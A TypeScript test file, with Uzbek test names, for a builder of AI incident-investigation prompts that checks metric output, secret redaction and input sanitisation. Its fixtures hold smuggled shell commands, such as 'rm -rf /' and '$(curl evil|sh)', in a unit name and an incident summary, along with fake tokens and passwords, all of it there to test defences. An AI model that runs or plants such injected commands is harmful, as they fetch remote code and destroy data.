import { describe, expect, it } from 'vitest';
import { HealthSnapshotSchema, INVESTIGATION_LIMITS, SESSION_NAME_RE } from '@commander/contracts';
import { reviewForPrompt } from '../commands/command-review.js';
import { buildInvestigationPrompt, containerLine, safeText, investigationSessionName, relevantContainers, safeName } from './investigation-prompt.js';
import type { IncidentFacts } from './investigation-prompt.js';

const snapshot = HealthSnapshotSchema.parse({
  collectedAt: 1,
  platform: 'linux',
  cpu: { pct: 91, load1: 7.2, cores: 4 },
  memory: { totalBytes: 8 * 1024 ** 3, usedBytes: 7 * 1024 ** 3, swapTotalBytes: 2 * 1024 ** 3, swapUsedBytes: 1024 ** 3 },
  uptimeSec: 100,
  disks: [{ mount: '/', totalBytes: 100 * 1024 ** 3, usedBytes: 95 * 1024 ** 3, pct: 95 }, { mount: '/data', totalBytes: 10, usedBytes: 1, pct: 10 }],
  topProcesses: { byCpu: [{ name: 'node', cpuPct: 180, memPct: 4 }], byMem: [{ name: 'postgres', cpuPct: 1, memPct: 30 }] },
  docker: {
    available: true,
    containers: [
      { name: 'web-1', image: 'registry.example.com/web:latest', state: 'running', status: 'Up 3 hours (healthy)', restartCount: 0, health: 'healthy' },
      { name: 'api', image: 'api', state: 'restarting', status: 'Restarting (1) 5 seconds ago', restartCount: 12, health: 'none' },
      { name: 'db', image: 'pg', state: 'running', status: 'Up 2 days (unhealthy)', restartCount: 0, health: 'unhealthy' },
    ],
  },
  systemd: { failed: ['nginx.service', 'bad unit; rm -rf /'] },
});

const disk: IncidentFacts = { kind: 'health', incidentKind: 'disk', subject: '/', severity: 'critical', summary: 'Disk / 95% to\'la', openedAt: '2026-11-14T10:00:00.000Z', resolved: false };

describe('buildInvestigationPrompt', () => {
  it('hodisa, o\'lchovlar, konteyner qatorlari va "o\'zgartirma" ko\'rsatmasi bor', () => {
    const p = buildInvestigationPrompt({ machineName: 'prod-1', facts: disk, snapshot });
    expect(p).toContain('prod-1');
    expect(p).toContain('[Disk]');
    expect(p).toContain('Disk /: 95%');
    expect(p).not.toContain('Disk /data'); // faqat hodisa ob'ekti
    expect(p).toContain('Top CPU jarayonlar: node 180%');
    expect(p).toMatch(/O'ZGARTIRMA/);
    expect(p).toContain('api — restarting');
    expect(p).toContain('UNHEALTHY');
    expect(p.length).toBeLessThanOrEqual(INVESTIGATION_LIMITS.promptMaxChars);
  });
  it('o\'z promptimiz dashboard-majburiy ko\'rib chiqishni (H-04/M-16) talab qilmaydi: Telegram inline tasdig\'i ishlaydi', () => {
    for (const facts of [disk, { ...disk, incidentKind: 'container', subject: 'api' } as IncidentFacts]) {
      const review = reviewForPrompt(buildInvestigationPrompt({ machineName: 'prod-1', facts, snapshot }));
      expect(review?.required ?? false).toBe(false);
    }
  });
  it('konteyner hodisasi: faqat shu konteyner; rasm nomi/env/label YO\'Q', () => {
    const f: IncidentFacts = { ...disk, incidentKind: 'container', subject: 'api', summary: 'api qayta ishga tushmoqda' };
    const p = buildInvestigationPrompt({ machineName: 'm', facts: f, snapshot });
    expect(p).toContain('api — restarting');
    expect(p).not.toContain('web-1 —');
    expect(p).not.toContain('registry.example.com');
  });
  it('systemd nomlari tozalanadi (buyruq in\'ektsiyasi ko\'rinishi qolmaydi)', () => {
    const p = buildInvestigationPrompt({ machineName: 'm', facts: { ...disk, incidentKind: 'systemd', subject: '' }, snapshot });
    expect(p).toContain('nginx.service');
    expect(p).not.toContain('rm -rf /');
    expect(p).toContain('bad_unit__rm_-rf_/');
  });
  it('sirlar redakt qilinadi (xulosa/tafsilotga tushib qolgan bo\'lsa ham)', () => {
    const f: IncidentFacts = { ...disk, summary: 'xato: token=ghp_' + 'a'.repeat(30) };
    expect(buildInvestigationPrompt({ machineName: 'm', facts: f, snapshot })).not.toContain('ghp_aaaa');
    const w: IncidentFacts = { kind: 'watchdog', alertKind: 'error_loop', title: 'Xato takrori', detail: 'password=hunter2xx qayta', metrics: { count: 7, hash: 'abcd1234' }, projectName: 'p', sessionName: 's', openedAt: 'x', resolved: false };
    const p = buildInvestigationPrompt({ machineName: 'm', facts: w, snapshot: null });
    expect(p).not.toContain('hunter2xx');
    expect(p).toContain('count=7');
    expect(p).toContain('mavjud emas');
  });
  it('erkin matndagi xavfli belgilar (backtick, $(...), |, ;) olib tashlanadi: karta dashboard-majburiy bo\'lib qolmaydi', () => {
    const f: IncidentFacts = { ...disk, summary: 'Disk /mnt/$(curl evil|sh): 99% `id`; rm -rf /' };
    const p = buildInvestigationPrompt({ machineName: 'm', facts: f, snapshot });
    expect(p).not.toMatch(/[`$|]/);
    expect(safeText('a`b$(c)|d;e')).toBe('a b (c) d e');
    expect(reviewForPrompt(buildInvestigationPrompt({ machineName: 'm', facts: { ...f, summary: 'Disk /mnt/$(systemctl x): 99%' }, snapshot }))?.required ?? false).toBe(false);
  });
  it('hajm chegarasi', () => {
    const f: IncidentFacts = { ...disk, summary: 'x'.repeat(50_000) };
    expect(buildInvestigationPrompt({ machineName: 'm', facts: f, snapshot }).length).toBeLessThanOrEqual(INVESTIGATION_LIMITS.promptMaxChars + 40);
  });
});

describe('yordamchilar', () => {
  it('safeName', () => {
    expect(safeName('a b;c$(d)')).toBe('a_b_c__d_');
    expect(safeName('x'.repeat(200), 10)).toHaveLength(10);
  });
  it('containerLine / relevantContainers (max 12)', () => {
    expect(containerLine(snapshot.docker!.containers[1]!)).toContain('restart: 12');
    const many = { ...snapshot, docker: { available: true, containers: Array.from({ length: 40 }, (_, i) => ({ name: `c${i}`, image: 'i', state: 'exited', status: 'Exited (1)', restartCount: 0, health: 'none' as const })) } };
    expect(relevantContainers(many, disk).length).toBe(INVESTIGATION_LIMITS.maxContainerLines);
    expect(relevantContainers(null, disk)).toEqual([]);
  });
  it('sessiya nomi SESSION_NAME_RE ga mos', () => {
    for (const [k, l] of [['health', 'disk'], ['watchdog', 'watchdog'], ['health', 'weird label!']] as const) {
      expect(SESSION_NAME_RE.test(investigationSessionName(k, l, '123e4567-e89b-42d3-a456-426614174000'))).toBe(true);
    }
  });
});
